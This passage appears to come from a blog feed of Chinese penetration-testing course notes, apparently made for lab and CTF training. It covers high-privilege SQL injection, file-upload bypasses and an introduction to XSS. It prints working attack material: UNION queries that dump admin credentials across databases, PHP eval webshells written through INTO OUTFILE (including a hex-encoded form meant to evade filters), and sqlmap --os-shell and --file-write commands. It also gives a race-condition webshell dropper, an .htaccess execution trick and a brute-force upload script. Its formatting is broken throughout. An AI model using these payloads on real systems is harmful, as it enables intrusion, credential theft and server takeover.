+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731214622552](/source/images/image-20210731214622552.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例4-高权限注入-跨库查询&amp;文件读取&amp;文件写入</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  实验：root xiaodi用户登录测试不同数据库用户数据操作，文件操作系统用户：所有数据库可看，文件读写正常普通用户：单个数据库可看，文件读写失败跨库查询猜解select load_file()select &#x27;a&#x27; into outfile &#x27;d:/www.txt&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="20、权限注入-amp-跨库-amp-文件读写-amp-命令执行"><a href="#20、权限注入-amp-跨库-amp-文件读写-amp-命令执行" class="headerlink" title="20、权限注入&amp;跨库&amp;文件读写&amp;命令执行"></a>20、权限注入&amp;跨库&amp;文件读写&amp;命令执行</h2><p>核心：首先判断是不是高权限用户，如果是，那么直接按照本课的命令进行高权限操作，如果不是，则进行普通的注入即可</p>
+<ul>
+<li>因为不同的数据库的高权限用户的叫法不一样，所以推荐使用sqlmap来进行判断<ul>
+<li>python3 sqlmap.py -u “xx.xx.xx.xx/?id=1”  –is-dba    </li>
+<li>如果返回True，则代表是高权限用户，就可以进行命令执行、跨库、文件操作、注册表操作、sql操作</li>
+</ul>
+</li>
+</ul>
+<p>1、高权限注入应用及原理判断</p>
+<p>2、那些数据库存在高权限注入操作</p>
+<p>3、高权限注入可操作具体有哪些方面</p>
+<ul>
+<li>linux上的mysql可以执行系统命令</li>
+<li>mysql在修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启之后，可以执行读取与写入操作</li>
+</ul>
+<p>#案例1-MYSQL跨库-手工演示对比工具说明</p>
+<p>什么是跨库？</p>
+<ul>
+<li><p>工具sqlmap进行跨库：使用 –tables能获取到所有的表，那么就是跨库</p>
+</li>
+<li><p>使用手工进行跨库</p>
+<ul>
+<li>```python<br>场景说明：A存在高权限注入导致同一数据库其他WEB应用数据泄露WEB应用A-<a href="http://127.0.0.1:8081/sqlilabs/WEB%E5%BA%94%E7%94%A8B-http://127.0.0.1:8081/maccms8/#information_schema%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8C%E6%9C%89%E4%B8%AA%E8%A1%A8schemata%E9%87%8C%E5%82%A8%E5%AD%98%E4%BA%86%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%80%8C%E8%AF%A5%E8%A1%A8%E9%87%8C%E9%9D%A2%E7%9A%84%E5%AD%97%E6%AE%B5SCHEMA_NAME%E4%B8%8B%E5%B0%B1%E6%98%AF%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%8D%E5%AD%97">http://127.0.0.1:8081/sqlilabs/WEB应用B-http://127.0.0.1:8081/maccms8/#information_schema数据库里有个表schemata里储存了所有的数据库信息，而该表里面的字段SCHEMA_NAME下就是所有的数据库的名字</a>     select SCHEMA_NAME from information_schema.schemata;-1 union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata–+#通过上一步获取到我们需要的数据库的名字：maccms#必须要通过限定数据库名为maccms才能查询到它里面的表-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’maccms’–+-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’mac_manager’ and table_schema=’maccms’–+#这里需要注意：因为是跨库，所以当我们从跨表查询数据，必须要加一个限定条件，比如哪个数据库、哪个表，两者用一个点 . 进行连接：maccms.mac_manager-1 union select 1,m_name,m_password from maccms.mac_manager–+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例2-MYSQL读写-手工演示对比工具说明</span><br><span class="line"></span><br><span class="line">- 缺点：都必须要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可，所以有很大的局限性</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  场景说明：WEB应用存在高权限注入点导致文件直接读写(后门植入)前提：知道绝对路径工具：Pangolin#可读取敏感文件，比如etc/passwd#易错点：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可-1 union select 1,load_file(&#x27;d:/test.txt&#x27;),3--+#当我们知道绝对路径，直接往绝对路径里写入一句话即可#比如这里的x可以替换成一句话， #易错点：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可-1 union select 1,&#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27;,3 into outfile &#x27;d:/www.txt&#x27;--+#易错点：如果网站做了防护，限制单引号或者eval等关键字的写入怎么办？	可以将一句话木马连同单引号转换为hex，通过小葵转换工具即可转换，因为在数据库中，hex的16进制也可以直接识别的   &#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27;     select 1,0x273C3F70687020406576616C28245F504F53545B2761747461636B275D293B3F3E27,3 into outfile &#x27;d:/shell.php&#x27;;WEB应用路径获取：说明文件,报错显示,特定源码爆出,配合读取中间件配置，爆破等	说明文件：比如phpadmin    特定源码：比如公开的cms里的目录结构    中间件配置：比如 宝塔，一般在绑定域名和路径的时候会需要设置，然后我们可以通过读取它的中间件的配置文件来获取绝对路径</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><img src="/source/images/image-20210801140021509.png" alt="image-20210801140021509"></p>
+<p>​        <img src="/source/images/image-20210801172128323.png" alt="image-20210801172128323"></p>
+</li>
+</ul>
+<p>#案例3-MSSQL注入-跨库&amp;文件读写&amp;命令执行</p>
+<p>工具：Pangolin 对比MYSQL或其他数据库可操作方面</p>
+<p>#案例4-ORACLE注入-工具可操作自动识别攻击</p>
+<ul>
+<li><pre><code class="python">SQLMAP--current-user 当前用户--is-dba     是否为管理员--file-read  从服务器读入，后面加上绝对路径，比如 &quot;d:/1.txt&quot; --file-write 从本地写入，和--file-dest搭配使用--file-dest  写入目标路径，和--file-write搭配使用#实列：   --file-write  &quot;e:/xiaoma.txt&quot;   --file-dest &quot;c:/www/1.php&quot; #上面的意思就是将我本地电脑下的xiiaoma.txt的内容写到目标服务器的www的目录下，并且保存为1.php--sql-shell  执行sql命令终端--os-shell  执行shell终端,会反弹一个shell回来，可以执行系统操作命令，并且返回一个url地址，该地址是一个上传文件的地址，我们可以通过该地址上传不容易被杀的马，然后拿下服务器权限（--os-cmd=ver 自定义命令（这里的ver是获取操作系统的版本） --os-cmd=OSCMD//执行操作系统命令--os-shell //反弹一个osshell--os-pwn //pwn，反弹msf下的shell或者vnc--os-smbrelay //反弹msf下的shell或者vnc--os-bof //存储过程缓存溢出--priv-esc //数据库提权#下面这2个语句是操作注册表的–reg-read –reg-add –reg-del –reg-key       --reg-value --reg-data --reg-typepython sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --file-read &quot;d:/test.txt&quot;python sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --file-write &quot;f:/host.txt&quot; --file-dest &quot;D:/phpstudy/PHPTutorial/WWW/sqlilabs/1.txt&quot;python sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --sql-shellselect * from mysql.userpython sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --os-shell
+</code></pre>
+</li>
+</ul>
+<p>#案例5-脚本语言SQL注入-PHP&amp;Javaweb&amp;Python</p>
+<ul>
+<li>语法，内置安全，结构等差异</li>
+</ul>
+<h2 id="—————SQL注入总结———"><a href="#—————SQL注入总结———" class="headerlink" title="—————SQL注入总结———-"></a>—————SQL注入总结———-</h2><p>SQL注入-安全测试思路总结</p>
+<ul>
+<li><p>漏洞判定-黑盒&amp;白盒</p>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li>​    参数类型 <ul>
+<li>决定是否闭合单引号</li>
+</ul>
+</li>
+<li>​    数据库类型<ul>
+<li>不同的数据库注入方法不一样</li>
+</ul>
+</li>
+<li>​    数据提交方式<ul>
+<li>不同的提交方式注入的位置不一样</li>
+</ul>
+</li>
+<li>​    数据SQL查询方式<ul>
+<li>不同的查询方式决定着是否是回显或者盲注</li>
+</ul>
+</li>
+<li>​    数据是否加密编码等<ul>
+<li>必须要将payload进行相同的编码才能注入</li>
+</ul>
+</li>
+<li>​    数据是否存在回显等</li>
+<li>​    注入权限是否高权限<ul>
+<li>有高权限，直接通过高权限进行操作</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>漏洞危害</p>
+<ul>
+<li>​    单个数据库数据泄露<ul>
+<li>普通用户</li>
+</ul>
+</li>
+<li>​    所有数据库数据泄露<ul>
+<li>高权限用户，跨库</li>
+</ul>
+</li>
+<li>​    后台权限丢失-数据配合后台登录等</li>
+<li>​    WEB权限丢失-文件操作,命令执行等</li>
+<li>​    可能后续导致服务器权限丢失等</li>
+</ul>
+</li>
+<li><p>漏洞特点</p>
+<ul>
+<li>​    1.开发语言决定SQL注入产生率<ul>
+<li>php的sql注入多，java和python相对而言就比较少了</li>
+</ul>
+</li>
+<li>​    2.数据库类型决定SQL注入利用过程</li>
+<li>​    3.部分SQL注入发现需人工进行探针<ul>
+<li>比如在查询方式为update、insert、delete的时候产生的注入，一般工具探测不到</li>
+</ul>
+</li>
+<li>​    4.防护SQL注入代码过滤或部署WAF</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>21-25、渗透测试(xiaodi)</title>
+    <url>/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
+    <content><![CDATA[<p>21、文件上传&amp;代码函数&amp;格式后缀&amp;场景</p>
+<p>文件上传-测试场景WEB&amp;APP等</p>
+<ul>
+<li>应用场景：只要一个地方可以上传，那么就可以进行文件上传测试<span id="more"></span>
+<ul>
+<li>app<ul>
+<li><img src="/source/images/image-20210802125224470.png" alt="image-20210802125224470"></li>
+</ul>
+</li>
+<li>网站</li>
+<li>软件</li>
+<li>网站的聊天窗口，可以发送图片的那种<ul>
+<li><img src="/source/images/image-20210802125143909.png" alt="image-20210802125143909"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>文件上传-基本知识后门文件格式解析</p>
+<ul>
+<li>特性：什么格式的代码，必须要用什么格式的后缀才能解析<ul>
+<li>比如php格式的一句话木马，必须要用php格式后缀才能被解析，如果采用txt后缀则不行</li>
+</ul>
+</li>
+</ul>
+<p>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases">Releases · rebeyond/Behinder · GitHub</a></p>
+<p>#案例4-文件上传-基本知识举例代码函数原理</p>
+<p>例子：PHP文件上传处理操作 $_FILES&amp;表单</p>
+<p>大小，名字，类型，临时名，上传内容</p>
+<ul>
+<li><img src="/source/images/image-20210802132810352.png" alt="image-20210802132810352"></li>
+</ul>
+<h2 id="22、文件上传JS-amp-后缀黑白名单-amp-格式检测"><a href="#22、文件上传JS-amp-后缀黑白名单-amp-格式检测" class="headerlink" title="22、文件上传JS&amp;后缀黑白名单&amp;格式检测"></a>22、文件上传JS&amp;后缀黑白名单&amp;格式检测</h2><p>#知识点：</p>
+<p>1、过滤验证客户端及服务端差异</p>
+<ul>
+<li>分类<ul>
+<li>客户端验证：自己的电脑上的浏览器上的JavaScript进行验证</li>
+<li>服务端验证：服务器进行验证</li>
+</ul>
+</li>
+<li>怎么分辨到底是客户端还是服务的验证？<ul>
+<li>客户端<ul>
+<li>可以在上传的页面，右键—查看源代码—里面会有一串JavaScript代码进行限制</li>
+<li>如果我们上传一个不符合的格式的文件，它很快就弹出格式不正确，那么应该也是客户端验证，毕竟如果是服务端验证，会需要一点时间的</li>
+<li>在上传php的时候抓包，如果我们点击上传的时候抓包，抓不到包，那么肯定就是客户端验证了，如果是服务端验证，必定会有数据包的<ul>
+<li>易错点：为什么jpg可以抓到包而php抓不到？因为php触发拦截了，所以抓不到包，所以必须要通过上传php文件来进行测试</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>2、过滤验证检测后缀黑名单绕过</p>
+<ul>
+<li>黑名单好绕过</li>
+</ul>
+<p>3、过滤验证检测后缀白名单绕过</p>
+<ul>
+<li>修改mine</li>
+<li>0x00和%00截断（需要满足php版本小于5.3.4和关掉php的魔术引号才行）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例1-后缀客户端验证-Js禁用&amp;Burp改包&amp;本地提交Pass01-客户端-验证方式绕过方法：	方法一：    	首先上传一张符合条件的图片（图片的内容里有一句话），然后抓包（此时可以抓到包，因为它是一张图片），然后修改数据包图片的后缀为php，这样就可以绕过了，同时该php可以直接用webshell工具进行连接，因为它里面包含了一句话木马     方法二：禁用js	#案例2-后缀黑名单验证-大小写&amp;加空格&amp;符号点&amp;::$DATA验证上传的后缀名是否在这个黑名单里，在的话一律不让上传Pass06-大小写-文件命名Pass07-加空格-系统特性Pass08-符号点-系统特性Pass09-::$DATA-系统特性Pass10-组合空格&amp;点-系统特性#案例3-后缀白名单验证-MIME修改&amp;%00截断&amp;0x00截断一、%00和0x00截断使用的前提条件：	（1）php版本必须小于5.3.4 	（2）打开php的配置文件php-ini，将magic_quotes_gpc设置为Off二、%00和0x00适用的位置：	%00一般用于url处，比如数据包的第一行，它一般拼接在url后面，比如下图的图一，在upload/ 后面拼接我们需要的文件名和后缀，接着在后面加上 %00 即可    0x00一般是在请求体中有一个上传的文件的保存路径的变量，我们需要在它后面拼接我们需要的文件名和后缀，比如1.php，然后在它后面按下空格，接着在hex的界面查看，将空格(hex下的20换成00即可)	    验证上传的后缀名是否在这里白名单里，不在的话一律不让上传Pass02-MIME-文件属性Pass12-%00-CVE-2015-2348Pass13-0x00-命名安全#案例4-后缀变异性验证-Finecms任意文件上传-验证MIME本地Finecms测试-配合Fofa搜索-&quot;FineCMS公益软件&quot;代码段：/finecms/dayrui/controllers/member/Account.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/source/images/image-20210803122815756.png" alt="image-20210803122815756"></p>
+<p><img src="/source/images/image-20210803123117618.png" alt="image-20210803123117618"></p>
+<p>文件上传靶场：<a href="https://github.com/c0ny1/upload-labs">GitHub - c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场</a></p>
+<p>文件上传流程图：</p>
+<ul>
+<li><img src="/source/images/image-20210802202200990.png" alt="image-20210802202200990"></li>
+</ul>
+<h2 id="23、文件上传解析漏洞-amp-条件竞争-amp-2次渲染"><a href="#23、文件上传解析漏洞-amp-条件竞争-amp-2次渲染" class="headerlink" title="23、文件上传解析漏洞&amp;条件竞争&amp;2次渲染"></a>23、文件上传解析漏洞&amp;条件竞争&amp;2次渲染</h2><p>1、过滤验证检测内容绕过</p>
+<p>2、过滤验证代码逻辑安全</p>
+<p>3、过滤验证解析&amp;格式&amp;规则</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例1-检测内容-图片后门&amp;二次渲染检测内容：修改文件头，比如gif的文件头就是GIF89aPass14 图片后门Pass17 二次渲染（一般使用gif进行绕过）图片后门制作：    copy shell.jpg/b + shell.php/a s.jpg    copy merge.gif/b + shell.php/a s.gif    c32asm 对比前后图片，观察哪些数据保留了，然后将一句话插在里面，再次上传，观察一句话还在不在</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>#案例2-代码逻辑-单次过滤&amp;条件竞争</p>
+<ul>
+<li><p>Pass11 单次过滤</p>
+<ul>
+<li>只是过滤了一次，没有循环过滤，比如 pphphp  ,因为只过滤了一次，所以可以绕过</li>
+</ul>
+</li>
+<li><p>Pass18 条件竞争</p>
+<ul>
+<li><p>产生原因：先移动上传的文件，然后再对移动的文件进行过滤，就会产生条件竞争</p>
+</li>
+<li><p>基本原理：上传php木马文件，因为网站首先会移动我们的木马文件到其他目录，接着会对该文件进行过滤，比如如果是php后缀就会删除该文件，所以我们可以上传一个a.php文件，因为网站是先移动后过滤（删除），所以a.php文件在对方服务器上存在过，这时我们完全可以不停的上传该a.php文件，该a.php文件的内容就是在当前目录创建一个新文件，新文件的内容是一句话木马，所以一旦我们访问到了a.php,对方的服务器就会自动从创建一个内容为一句话木马的php文件，那么我们的目的就达到了</p>
+</li>
+<li><p>实现步骤：</p>
+<ul>
+<li><p>burp不停的上传a.php文件，a.php的代码必须是：</p>
+<ul>
+<li>```php<?php $file=fopen('x.php','w+');fwrite($file,'<?php @eval($_POST[x];?>‘);fclose($file);?&gt;<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    - 其次，不停的访问该上传的a.php文件，目的是触发它的php文件，让他创建shell</span><br><span class="line"></span><br><span class="line">    - 一旦访问成功，shell就创建成功，到时候只需要用webshell工具连接x.php即可，密码是x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web中间件常见漏洞：参考pdf  web中间件常见漏洞总结.pdf  ，有具体的pdf</span><br><span class="line"></span><br><span class="line">- ![image-20210803123453617](/source/images/image-20210803123453617.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#案例3-解析安全-格式变异&amp;中间件解析比如：可以php5  或者phtml    这些后缀也可以被当作php来执行Pass03 php5对应Pass04 .htaccess   （适用于apache）Vulhub 解析漏洞-Nginx(cve2013&amp;解析)Mozhe 解析漏洞-IIS-内部文件上传系统测试htaccess文件：下面是代码，意思就是当我们将该.htaccess文件上传到对方目录，再上传一个shell.jpg的图片马，再访问该图片马，那么该shell.jpg也会被当作php执行GIF89a&lt;?php @eval($_POST[&#x27;s&#x27;]);phpinfo();?&gt;&lt;FilesMatch &quot;shell.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例4-CTF分享-Buuoj平台部分上传题库https://buuoj.cn/challenges[极客大挑战 2019]Upload	大挑战：限制了后缀、检测了文件头、不允许文件的内容里有 &lt;?    ，找不到上传的图片的地址    绕过：后缀改为phtml、加文件头GIF89a   、通过变异的一句话木马绕过，通过扫目录、猜解目录得到上传的文件的地址，比如这里就猜 /upload    变异的语句和木马如下（可自行百度，只要找到不包含问号的即可）：&lt;script language=&quot;php&quot;&gt;eval($_POST[x])&lt;/script&gt;// ]]&gt;&lt;/script&gt;参考连接：        [ACTF2020 新生赛]Upload[GXYCTF2019]BabyUpload......</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="24、文件上传CTF-amp-中间件-amp-CMS-amp-编辑器"><a href="#24、文件上传CTF-amp-中间件-amp-CMS-amp-编辑器" class="headerlink" title="24、文件上传CTF&amp;中间件&amp;CMS&amp;编辑器"></a>24、文件上传CTF&amp;中间件&amp;CMS&amp;编辑器</h2><p>#知识点：</p>
+<p>1、文件上传常规类应用场景</p>
+<p>2、文件上传CMS类应用场景</p>
+<p>3、文件上传编辑器类应用场景</p>
+<p>4、文件上传中间件类应用场景</p>
+<p>5、文件上传CTF比赛类应用场景</p>
+<p>#思路点：</p>
+<ul>
+<li>文件上传不管是发现还是利用上都会根据产生层面而不同，</li>
+<li>常规无资料采用常规思路测试，有资料（往上搜索有的话）的情况下直接参考资料进行。</li>
+</ul>
+<p>#案例1-针对CMS类思路-phpcms</p>
+<ul>
+<li><p>思路：去往上搜索该cms的存在的漏洞，比如这里就是phpcms的上传漏洞，找到后直接根据别人给的资料进行复现即可</p>
+</li>
+<li><p><a href="https://www.cnblogs.com/sqyysec/p/6725870.html">https://www.cnblogs.com/sqyysec/p/6725870.html</a></p>
+</li>
+</ul>
+<p>#案例2-针对编辑器类思路-Ueditor</p>
+<ul>
+<li><p>怎么知道当前编辑器是什么编辑器？</p>
+<ul>
+<li>编辑器里有一个帮助按钮，点击查看一般就会有当前编辑器的信息</li>
+</ul>
+</li>
+<li><p><a href="https://blog.csdn.net/sinat_40293958/article/details/107208040">https://blog.csdn.net/sinat_40293958/article/details/107208040</a></p>
+</li>
+</ul>
+<p>编辑器类和cms类的区别？</p>
+<ul>
+<li>假设当前cms是已知的，也存在编辑器，那么我们怎么在网上搜索资料？<ul>
+<li>如果上传功能在编辑器，我们就搜索当前编辑器的上传漏洞，而不能搜索cms的上传漏洞，当然如果当前编辑器没有漏洞，那么可以根据当前cms的名称去搜索该cms的其他漏洞<ul>
+<li>编辑器图片<ul>
+<li><img src="/source/images/image-20210804122650803.png" alt="image-20210804122650803"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>#案例3-针对中间件类思路-Weblogic（基于java环境）</p>
+<ul>
+<li><p>怎么发现当前网站有没有Weblogic？</p>
+<ul>
+<li>扫描端口，weblogic的端口是7001</li>
+</ul>
+</li>
+<li><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+</li>
+<li><p><a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/">https://vulhub.org/#/environments/weblogic/CVE-2018-2894/</a></p>
+<ul>
+<li><p>该上传漏洞前提：需要账号密码</p>
+<ul>
+<li>账号密码的获取，可以采用默认密码或者爆破进行尝试</li>
+</ul>
+</li>
+<li><p>该上传漏洞需要jsp后门：因为是基于java环境的</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>#案例4-针对CTF比赛类思路-[GXYCTF2019]&amp;[RoarCTF 2019]</p>
+<ul>
+<li>```python<br><a href="https://github.com/TheKingOfDuck/fuzzDicts/[GXYCTF2019]BabyUploadFuzz-fuzzDicts-upload">https://github.com/TheKingOfDuck/fuzzDicts/[GXYCTF2019]BabyUploadFuzz-fuzzDicts-upload</a>&lt;FilesMatch “s.jpg”&gt;  SetHandler application/x-httpd-php</FilesMatch><script language='php'>assert($_REQUEST['cmd'])</script><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  [RoarCTF 2019]Simple Upload#前提：需要thinkphp基础，要知道怎么调用文件Tp-URL模式-代码审计-Pass21Py-构造上传-无回显命名-发包访问http://document.thinkphp.cn/manual_3_2.htmlimport requestsurl=&#x27;http://14a56f1b-f5ca-483e-a0d7-0d503a8db91a.node3.buuoj.cn/index.php/home/index/upload&#x27;file1=&#123;&#x27;file&#x27;:open(&#x27;f:\\1.txt&#x27;,&#x27;r&#x27;)&#125;file2=&#123;&#x27;file[]&#x27;:open(&#x27;f:\\1.php&#x27;,&#x27;r&#x27;)&#125;r = requests.post(url,files = file1)print(r.text)r = requests.post(url,files = file2)print(r.text)r = requests.post(url, files = file1)print(r.text)&#x27;&#x27;&#x27;import requestsimport timefor i in range(736769,755374,1):    url=&#x27;http://14a56f1b-f5ca-483e-a0d7-0d503a8db91a.node3.buuoj.cn/Public/Uploads//2021-03-14//604cf0b&#x27;    urls=url+str(i)+&#x27;.php&#x27;    #print(str(i))    code=requests.get(urls).status_codeif code==&#x27;200&#x27;:break    print(urls+&#x27;-&gt;&#x27;+str(code))    time.sleep(0.2)    </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>漏洞复现靶场：<a href="https://www.vulhub.org/">https://www.vulhub.org/</a></p>
+<p>webshll地址：<a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+<h2 id="—————文件上传总结———"><a href="#—————文件上传总结———" class="headerlink" title="—————文件上传总结———-"></a>—————文件上传总结———-</h2><p>总体思路：优先级从高到低，在上传的时候注意观察前端的提示和数据包的返回包</p>
+<ul>
+<li><p>编辑器上传</p>
+</li>
+<li><p>已知cms</p>
+</li>
+<li><p>常规上传</p>
+<ul>
+<li><p>使用正常的图片，然后fuzz它的后缀名，fuzz的字典：<a href="https://github.com/TheKingOfDuck/fuzzDicts/">https://github.com/TheKingOfDuck/fuzzDicts/</a></p>
+<ul>
+<li>成功就是黑名单<ul>
+<li>接着修改文件内容，插入一句话，看能否成功<ul>
+<li>如果失败，就尝试修改IMIE，如果还不成功，就尝试修改文件头</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>失败就是白名单<ul>
+<li>白名单可以尝试如下方法<ul>
+<li>00截断</li>
+<li>0x00截断</li>
+<li>配合中间件解析漏洞：web中间件常见漏洞：参考pdf  web中间件常见漏洞总结.pdf  ，有具体的pdf</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="25、XSS跨站-amp-反射型-amp-存储型-amp-DOM型"><a href="#25、XSS跨站-amp-反射型-amp-存储型-amp-DOM型" class="headerlink" title="25、XSS跨站&amp;反射型&amp;存储型&amp;DOM型"></a>25、XSS跨站&amp;反射型&amp;存储型&amp;DOM型</h2><p>1、XSS跨站原理&amp;分类&amp;危害&amp;修复</p>
+<ul>
+<li><p>原理</p>
+<ul>
+<li>指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。</li>
+</ul>
+</li>
+<li><p>漏洞产生的地方</p>
+<ul>
+<li>数据交互的地方<ul>
+<li>​    get、post、headers</li>
+<li>​    反馈与浏览</li>
+<li>​    富文本编辑器</li>
+<li>​    各类标签插入和自定义</li>
+</ul>
+</li>
+<li>数据输出的地方<ul>
+<li>​    用户资料</li>
+<li>​    关键词、标签、说明</li>
+<li>​    文件上传</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>分类</p>
+<ul>
+<li>​    反射型（非持久型）<ul>
+<li>前提：必须要将构造的payload发送给被攻击者触发才有用，比较鸡肋</li>
+</ul>
+</li>
+<li>​    存储型（持久型）</li>
+<li>​    DOM型</li>
+<li>​    mXSS(突变型XSS) </li>
+<li>​    UXSS（通用型xss）</li>
+<li>​    Flash XSS</li>
+<li>​    UTF-7 XSS</li>
+<li>​    MHTML XSS</li>
+<li>​    CSS XSS </li>
+<li>​    VBScript XSS</li>
+<li>​    …….</li>
+</ul>
+</li>
+<li><p>​    危害</p>
+<ul>
+<li>​    网络钓鱼，包括获取各类用户账号；</li>
+<li>​    窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；</li>
+<li>​    劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；</li>
+<li>​    强制弹出广告页面、刷流量等；</li>
+<li>​    网页挂马；</li>
+<li>​    进行恶意操作，如任意篡改页面信息、删除文章等；</li>
+<li>​    进行大量的客户端攻击，如ddos等；</li>
+<li>​    获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</li>
+<li>​    控制受害者机器向其他网站发起攻击；</li>
+<li>​    结合其他漏洞，如csrf,实施进一步危害；</li>
+<li>​    提升用户权限，包括进一步渗透网站；</li>
+<li>​    传播跨站脚本蠕虫等</li>
+</ul>
+</li>
+<li><p>修复</p>
+<ul>
+<li>​    见绕过课程对比参考</li>
+</ul>
+</li>
+</ul>
+<p>2、XSS跨站分类(上)-反射&amp;存储&amp;DOM</p>
+<p>3、XSS跨站利用(上)-工具BEEF&amp;XSS平台</p>
+<p>#案例1-XSS产生原理演示-数据输入输出</p>
+<ul>
+<li>核心：就是我们能控制页面的显示内容，比如浏览器内核版本在线检测，它是识别我们的user-agent，我们可以抓包，修改agent，并且页面显示的agent和我们修改的一样，这就代表我们可以控制页面显示的内容，此时如果我们将此内容修改为xss代码，那么可能就可以造成攻击</li>
+<li>疑问：如果将我们的 弹出xss代码原封不动的显示了，却没造成应有的效果咋办？<ul>
+<li>可能是浏览器将我们的xss代码当作字符串来处理了，我们可以右键当前页面，查看元素，然后尝试绕过（闭合标签来绕过）</li>
+</ul>
+</li>
+</ul>
+<p>#案例2-实例反射型XSS演示-UA查询平台</p>
+<ul>
+<li>攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。</li>
+<li>网站的搜索栏、用户登录入口、输入表单等地方</li>
+</ul>
+<p>​    </p>
+<p>在线xss平台的使用</p>
+<ul>
+<li>功能：有很多功能，可以自行尝试，但是有些功能需要配置参数，需要自行百度</li>
+<li>新建项目，名字和备注随便输入</li>
+<li>配置模块，选择默认模块—-无keepsession（这个就默认可以读取cookie了）</li>
+</ul>
+<p>在线xss平台的危害：</p>
+<ul>
+<li>我们获取到的数据，网站管理员也相当于间接获取到了，所以如果操作敏感的一些东西的话，还是建议使用自己搭建的平台</li>
+</ul>
+<p>#案例3-实例存储型XSS演示-业务订单系统</p>
+<ul>
+<li>随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户浏览器中得到执行。</li>
+<li>蓝莲花xss平台源码（自行搭建）：<a href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></li>
+<li>论坛、博客、留言板、网站的留言、评论、日志等交互处</li>
+</ul>
+<p>工具：Beef 使用&amp;功能说明</p>
+<ul>
